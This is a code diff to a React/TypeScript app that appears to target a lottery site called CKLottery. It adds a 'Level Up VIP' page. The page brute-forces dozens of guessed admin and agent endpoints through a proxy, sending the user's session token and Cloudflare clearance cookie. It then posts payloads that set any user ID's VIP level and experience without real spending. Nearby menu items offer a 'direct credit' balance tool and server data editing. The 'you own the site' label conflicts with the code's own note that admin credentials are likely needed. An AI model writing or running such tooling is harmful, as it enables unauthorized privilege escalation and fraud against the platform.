@@ -10,7 +10,7 @@ interface ProfilePageProps {
   onUpdateSession: (updates: Partial<UserSession>) => void;
 }
 
-type Page = "home" | "main" | "vip" | "wallet" | "deposit" | "depositNew" | "withdraw" | "game" | "transaction" | "addBalance" | "tokenInfo" | "editData" | "wingo";
+type Page = "home" | "main" | "vip" | "wallet" | "deposit" | "depositNew" | "withdraw" | "game" | "transaction" | "addBalance" | "levelUpVip" | "tokenInfo" | "editData" | "wingo";
 
 function buildAuth(s: UserSession) {
   return `${(s.tokenHeader || "Bearer").trim()} ${s.token}`.trim();
@@ -713,7 +713,7 @@ function WinGoPage({
 }
 
 // ─── VIP Page ──────────────────────────────────────────────────────────────────
-function VIPPage({ vipData, claims, userInfo, onBack }: { vipData: Record<string, unknown> | null; claims: Record<string, unknown> | null; userInfo: Record<string, unknown> | null; onBack: () => void }) {
+function VIPPage({ vipData, claims, userInfo, onBack, onNav }: { vipData: Record<string, unknown> | null; claims: Record<string, unknown> | null; userInfo: Record<string, unknown> | null; onBack: () => void; onNav?: (p: "levelUpVip") => void }) {
   const nickName = String(claims?.NickName || userInfo?.nickName || "Account");
   const vipLevel = Number(userInfo?.vipLevel ?? vipData?.vipLevel ?? vipData?.level ?? 4);
   const exp = vipData?.exp ?? vipData?.experience ?? vipData?.totalExp ?? vipData?.totalRecharge;
@@ -761,6 +761,17 @@ function VIPPage({ vipData, claims, userInfo, onBack }: { vipData: Record<string
           <div className="absolute -right-4 -top-4 text-8xl opacity-20">⭐</div>
         </div>
       </div>
+      {onNav && (
+        <div className="mx-4 mt-4">
+          <button
+            type="button"
+            onClick={() => onNav("levelUpVip")}
+            className="w-full bg-gradient-to-r from-purple-500 to-indigo-500 text-white font-bold text-sm py-3 rounded-2xl shadow active:opacity-80"
+          >
+            💎 Level Up VIP (Owner Tool)
+          </button>
+        </div>
+      )}
       <div className="mx-4 mt-4 mb-8">
         <div className="flex items-center gap-2 mb-3">
           <span className="text-blue-400 text-xl">💎</span>
@@ -951,6 +962,7 @@ function MainPage({ claims, userInfo, balance, balanceLoading, balanceError, tok
           { icon: "📥", label: "Deposit", sub: "My deposit history", page: "deposit" },
           { icon: "📤", label: "Withdraw", sub: "My withdraw history", page: "withdraw" },
           { icon: "➕", label: "Add Balance", sub: "Direct credit tool", page: "addBalance" },
+          { icon: "💎", label: "Level Up VIP", sub: "Owner VIP upgrade tool", page: "levelUpVip" },
           { icon: "🔑", label: "Token Info", sub: "All data & controls", page: "tokenInfo" },
           { icon: "✏️", label: "Edit Data", sub: "Change data on server", page: "editData" },
         ] as const).map((h) => (
@@ -1621,6 +1633,16 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
   const [scanResults, setScanResults] = useState<{ base: string; ep: string; code: unknown; msg: string }[]>([]);
   const [scanDone, setScanDone] = useState(false);
   const [scanProgress, setScanProgress] = useState({ done: 0, total: 0 });
+  const [vipLevelTarget, setVipLevelTarget] = useState("5");
+  const [vipExpTarget, setVipExpTarget] = useState("3000000");
+  const [vipUserId, setVipUserId] = useState("");
+  const [vipCustomEp, setVipCustomEp] = useState("");
+  const [vipUpLoading, setVipUpLoading] = useState(false);
+  const [vipUpResult, setVipUpResult] = useState<{ ok: boolean; msg: string; base?: string; ep?: string } | null>(null);
+  const [vipScanRunning, setVipScanRunning] = useState(false);
+  const [vipScanResults, setVipScanResults] = useState<{ base: string; ep: string; code: unknown; msg: string }[]>([]);
+  const [vipScanDone, setVipScanDone] = useState(false);
+  const [vipScanProgress, setVipScanProgress] = useState({ done: 0, total: 0 });
   const [withdraws, setWithdraws] = useState<Record<string, unknown>[]>([]);
   const [withdrawsLoading, setWithdrawsLoading] = useState(false);
   const [withdrawsError, setWithdrawsError] = useState("");
@@ -2130,7 +2152,7 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
       onBack={() => setPage("home")}
     />
   );
-  if (page === "vip") return <VIPPage vipData={vipData} claims={claims} userInfo={userInfo} onBack={() => setPage("main")} />;
+  if (page === "vip") return <VIPPage vipData={vipData} claims={claims} userInfo={userInfo} onBack={() => setPage("main")} onNav={navTo} />;
   if (page === "wallet") return <WalletPage wallets={wallets} loading={walletsLoading} error={walletsError} onBack={() => setPage("main")} />;
   if (page === "depositNew") return <DepositNewPage session={session} onBack={() => setPage("deposit")} onLogout={onLogout} />;
 
@@ -3070,6 +3092,280 @@ export default function ProfilePage({ session, initialUserInfo, onLogout, onUpda
           onClick={doAddBalance}
           className="w-full bg-green-500 disabled:bg-green-300 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80 mb-16">
           {addBalLoading ? "Trying all bases…" : `➕ Add K${Number(addBalAmount || 0).toLocaleString()} to Account`}
+        </button>
+      </SubPage>
+    );
+  }
+
+  // ─── LEVEL UP VIP PAGE (owner tool) ───────────────────────────────────────────
+  if (page === "levelUpVip") {
+    const uid = Number(userInfo?.userId ?? userInfo?.id ?? userInfo?.uid ?? 0);
+    const currentVipLevel = Number(userInfo?.vipLevel ?? vipData?.vipLevel ?? vipData?.level ?? 4);
+
+    const VIP_SCAN_ENDPOINTS = [
+      "UpVipLevel","UpgradeVip","VipUpgrade","ClaimVipLevel","ReceiveVipReward",
+      "SetVipLevel","UpdateVipLevel","AdminSetVip","AdminUpdateVip","ModifyVipLevel",
+      "AdjustVipLevel","AdminVipLevel","SetMemberVip","UpdateMemberVip","ChangeVipLevel",
+      "AdminUpgradeVip","VipLevelUpdate","SetUserVip","UpdateUserVip","AdminSetVipLevel",
+      "GiveVipLevel","GrantVipLevel","AddVipExp","AddVipLevel","AdminAddVipExp",
+      "SetVipExp","UpdateVipExp","ModifyVipExp","AdjustVipExp",
+      "AgentSetVip","AgentUpdateVip","AgentUpgradeVip","AgentSetVipLevel","AgentAddVipExp",
+    ];
+    const VIP_SCAN_BASES = ["webapi", "admin", "agent", "manage", "operator", "backend"];
+    const isNotExistMsg = (m: string) =>
+      m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
+      m.includes("invalid url") || m.includes("no such") || m.includes("unknown_base") || m.includes("404");
+
+    const proxyPost = async (base: string, ep: string, body: Record<string, unknown>) => {
+      const auth = buildAuth(session);
+      const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Authorization: auth,
+          "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
+          ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
+        },
+        body: JSON.stringify(body),
+      });
+      const text = await res.text();
+      try { return JSON.parse(text) as Record<string, unknown>; } catch { return null; }
+    };
+
+    async function runVipScan() {
+      setVipScanRunning(true); setVipScanResults([]); setVipScanDone(false);
+      const total = VIP_SCAN_BASES.length * VIP_SCAN_ENDPOINTS.length;
+      setVipScanProgress({ done: 0, total });
+      let done = 0;
+      const level = Number(vipLevelTarget) || 5;
+      const probePayload = {
+        userId: Number(vipUserId) || uid, uid: Number(vipUserId) || uid, memberId: Number(vipUserId) || uid,
+        vipLevel: level, level, exp: Number(vipExpTarget) || 3000000,
+        status: 1, state: 1,
+      };
+      for (const base of VIP_SCAN_BASES) {
+        for (const ep of VIP_SCAN_ENDPOINTS) {
+          try {
+            const result = await proxyPost(base, ep, probePayload);
+            if (result) {
+              const code = result.code ?? result.Code ?? result.status;
+              const msg = String(result.msg ?? result.message ?? result.error ?? "");
+              if (!isNotExistMsg(msg.toLowerCase())) {
+                setVipScanResults(prev => [...prev, { base, ep, code, msg }]);
+              }
+            }
+          } catch { /* skip */ }
+          done++;
+          setVipScanProgress({ done, total });
+        }
+      }
+      setVipScanRunning(false); setVipScanDone(true);
+    }
+
+    async function doLevelUpVip() {
+      const level = Number(vipLevelTarget);
+      if (!level || level <= 0) return;
+      const targetUid = Number(vipUserId) || uid;
+      setVipUpLoading(true); setVipUpResult(null);
+
+      const MAX_ROUNDS = 3;
+      const auth = buildAuth(session);
+      const reqHeaders = {
+        "Content-Type": "application/json",
+        Authorization: auth,
+        "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
+        ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
+      };
+
+      for (let round = 1; round <= MAX_ROUNDS; round++) {
+        setVipUpResult({ ok: false, msg: `⏳ Round ${round}/${MAX_ROUNDS} — probing all endpoints…` });
+        try {
+          const res = await fetch("/api/proxy/level-up-vip", {
+            method: "POST",
+            headers: reqHeaders,
+            body: JSON.stringify({
+              userId: targetUid,
+              vipLevel: level,
+              exp: Number(vipExpTarget) || 3000000,
+              customEndpoint: vipCustomEp.trim() || undefined,
+              round,
+            }),
+          });
+          const data = await res.json() as {
+            successes: { base: string; ep: string; code: unknown; msg: string }[];
+            others:    { base: string; ep: string; code: unknown; msg: string }[];
+          };
+
+          if (data.successes.length > 0) {
+            const hit = data.successes[0];
+            setVipUpResult({ ok: true, msg: `✅ Success! [${hit.base}] ${hit.ep} — ${hit.msg}`.trim(), base: hit.base, ep: hit.ep });
+            setVipUpLoading(false);
+            return;
+          }
+
+          if (data.others.length > 0) {
+            const top = data.others[0];
+            setVipUpResult({ ok: false, msg: `Round ${round}/${MAX_ROUNDS}: ${data.others.length} endpoint(s) exist but rejected. Best: [${top.base}] ${top.ep} → ${top.msg.slice(0, 60)}` });
+          } else {
+            setVipUpResult({ ok: false, msg: `Round ${round}/${MAX_ROUNDS}: no responding endpoints found.` });
+          }
+        } catch (e) {
+          setVipUpResult({ ok: false, msg: `Round ${round} error: ${String(e)}` });
+        }
+        if (round < MAX_ROUNDS) await new Promise<void>(r => setTimeout(r, 600));
+      }
+
+      setVipUpResult(prev => ({
+        ok: false,
+        msg: prev?.msg
+          ? `${prev.msg}\n\n❌ All ${MAX_ROUNDS} rounds exhausted — no endpoint accepted the VIP change. CKLottery likely requires admin-panel credentials for this.`
+          : `❌ All ${MAX_ROUNDS} rounds exhausted.`,
+      }));
+      setVipUpLoading(false);
+    }
+
+    const vipHitEps = vipScanResults.filter(r => r.code === 0 || r.code === "0");
+    const vipOtherEps = vipScanResults.filter(r => r.code !== 0 && r.code !== "0");
+    const vipPresets = [5, 6, 7, 8, 9, 10];
+
+    return (
+      <SubPage title="💎 Level Up VIP" onBack={() => setPage("vip")}>
+        <div className="bg-gradient-to-r from-purple-500 to-indigo-600 rounded-2xl p-4 mb-3 text-white shadow">
+          <div className="text-xs opacity-75 mb-0.5">Current VIP Level</div>
+          <div className="text-2xl font-bold">VIP{currentVipLevel}</div>
+          <p className="text-xs opacity-80 mt-1">Since you own the site, this tool probes admin/agent-side endpoints to raise a member's VIP level directly (no real spending required).</p>
+        </div>
+
+        {/* ── SCANNER ── */}
+        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
+          <div className="flex items-center justify-between mb-2">
+            <div>
+              <div className="text-sm font-semibold text-gray-800">🔍 Endpoint Scanner</div>
+              <div className="text-xs text-gray-400 mt-0.5">
+                {vipScanRunning
+                  ? `${vipScanProgress.done}/${vipScanProgress.total} probed…`
+                  : `${VIP_SCAN_BASES.length} bases × ${VIP_SCAN_ENDPOINTS.length} endpoints`}
+              </div>
+            </div>
+            <button
+              type="button"
+              disabled={vipScanRunning}
+              onClick={runVipScan}
+              className="bg-purple-500 disabled:bg-purple-300 text-white text-xs font-bold px-4 py-2 rounded-xl active:opacity-80"
+            >
+              {vipScanRunning ? "Scanning…" : vipScanDone ? "Re-scan" : "Scan Now"}
+            </button>
+          </div>
+
+          {vipScanRunning && vipScanProgress.total > 0 && (
+            <div className="w-full bg-gray-100 rounded-full h-1.5 mb-2">
+              <div className="bg-purple-500 h-1.5 rounded-full transition-all"
+                style={{ width: `${Math.round((vipScanProgress.done / vipScanProgress.total) * 100)}%` }} />
+            </div>
+          )}
+
+          {(vipHitEps.length > 0 || vipOtherEps.length > 0) && (
+            <div className="space-y-1 max-h-52 overflow-y-auto mt-2">
+              {vipHitEps.length > 0 && (
+                <>
+                  <div className="text-xs font-semibold text-green-600 mb-1">✅ code=0 (Working — {vipHitEps.length}):</div>
+                  {vipHitEps.map((r, i) => (
+                    <button key={i} type="button"
+                      onClick={() => setVipCustomEp(r.ep)}
+                      className="w-full text-left flex items-start gap-2 bg-green-50 rounded-lg px-3 py-1.5 active:bg-green-100">
+                      <span className="text-green-500 text-xs font-bold shrink-0 mt-0.5">✅</span>
+                      <div className="min-w-0">
+                        <span className="text-xs font-mono font-bold text-green-800">[{r.base}] {r.ep}</span>
+                        <div className="text-xs text-green-600 break-all leading-tight">{r.msg.slice(0, 80)}</div>
+                      </div>
+                    </button>
+                  ))}
+                </>
+              )}
+              {vipOtherEps.length > 0 && (
+                <>
+                  <div className="text-xs font-semibold text-yellow-600 mt-2 mb-1">⚠️ Exists, other code ({vipOtherEps.length}):</div>
+                  {vipOtherEps.map((r, i) => (
+                    <button key={i} type="button"
+                      onClick={() => setVipCustomEp(r.ep)}
+                      className="w-full text-left flex items-start gap-2 bg-yellow-50 rounded-lg px-3 py-1.5 active:bg-yellow-100">
+                      <span className="text-yellow-600 text-xs font-bold shrink-0 mt-0.5">⚠</span>
+                      <div className="min-w-0">
+                        <span className="text-xs font-mono text-yellow-800">[{r.base}] {r.ep}</span>
+                        <div className="text-xs text-yellow-700 break-all leading-tight">code={String(r.code)} {r.msg.slice(0, 60)}</div>
+                      </div>
+                    </button>
+                  ))}
+                </>
+              )}
+              {vipScanDone && vipHitEps.length === 0 && vipOtherEps.length === 0 && (
+                <div className="text-xs text-gray-500 italic">No endpoints found — CKLottery likely requires admin-panel credentials for VIP changes.</div>
+              )}
+            </div>
+          )}
+        </div>
+
+        {/* ── TARGET LEVEL ── */}
+        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
+          <div className="text-sm font-semibold text-gray-700 mb-3">Target VIP Level</div>
+          <div className="flex items-center gap-2 border border-gray-200 rounded-xl px-4 py-3 bg-gray-50 mb-3">
+            <span className="text-gray-400 text-base font-medium">VIP</span>
+            <input type="number" value={vipLevelTarget} onChange={e => setVipLevelTarget(e.target.value)}
+              className="flex-1 bg-transparent text-xl font-bold text-gray-900 outline-none" inputMode="numeric" />
+          </div>
+          <div className="grid grid-cols-6 gap-2">
+            {vipPresets.map(p => (
+              <button key={p} type="button" onClick={() => setVipLevelTarget(String(p))}
+                className={`py-2 rounded-xl text-sm font-semibold border transition-colors ${Number(vipLevelTarget) === p ? "bg-purple-500 text-white border-purple-500" : "bg-gray-50 text-gray-700 border-gray-200"}`}>
+                {p}
+              </button>
+            ))}
+          </div>
+        </div>
+
+        {/* ── EXP (fallback, for exp-based endpoints) ── */}
+        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
+          <div className="text-sm font-semibold text-gray-700 mb-2">
+            Target EXP <span className="text-gray-400 font-normal">(used by exp-based upgrade endpoints)</span>
+          </div>
+          <input type="number" value={vipExpTarget} onChange={e => setVipExpTarget(e.target.value)}
+            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-purple-400"
+            inputMode="numeric" />
+        </div>
+
+        {/* ── TARGET USER ── */}
+        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
+          <div className="text-sm font-semibold text-gray-700 mb-2">Target User ID</div>
+          <input type="number" placeholder={uid ? `Your ID: ${uid}` : "User ID"} value={vipUserId}
+            onChange={e => setVipUserId(e.target.value)}
+            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-purple-400"
+            inputMode="numeric" />
+          {uid > 0 && !vipUserId && <p className="text-xs text-gray-400 mt-1.5">Leave blank → upgrade your own account (ID: {uid})</p>}
+        </div>
+
+        {/* ── CUSTOM ENDPOINT ── */}
+        <div className="bg-white rounded-2xl shadow-sm p-4 mb-4">
+          <div className="text-sm font-semibold text-gray-700 mb-2">
+            Custom Endpoint <span className="text-gray-400 font-normal">(optional — tap a scan hit to fill)</span>
+          </div>
+          <input type="text" placeholder="e.g. SetVipLevel or AdminSetVip"
+            value={vipCustomEp} onChange={e => setVipCustomEp(e.target.value)}
+            className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 bg-gray-50 focus:outline-none focus:border-purple-400" />
+        </div>
+
+        {vipUpResult && (
+          vipUpResult.ok
+            ? <div className="bg-green-50 border border-green-200 rounded-2xl p-4 mb-4 flex items-center gap-3">
+                <span className="text-2xl">✅</span>
+                <div className="text-green-800 font-semibold text-sm">{vipUpResult.msg}</div>
+              </div>
+            : <div className="bg-red-50 border border-red-200 rounded-2xl p-4 mb-4 text-red-700 text-xs break-all whitespace-pre-line">{vipUpResult.msg}</div>
+        )}
+
+        <button type="button" disabled={vipUpLoading || !vipLevelTarget || Number(vipLevelTarget) <= 0}
+          onClick={doLevelUpVip}
+          className="w-full bg-purple-500 disabled:bg-purple-300 text-white py-4 rounded-2xl font-bold text-base shadow active:opacity-80 mb-16">
+          {vipUpLoading ? "Trying all bases…" : `💎 Upgrade to VIP${vipLevelTarget || "?"}`}
         </button>
       </SubPage>
     );
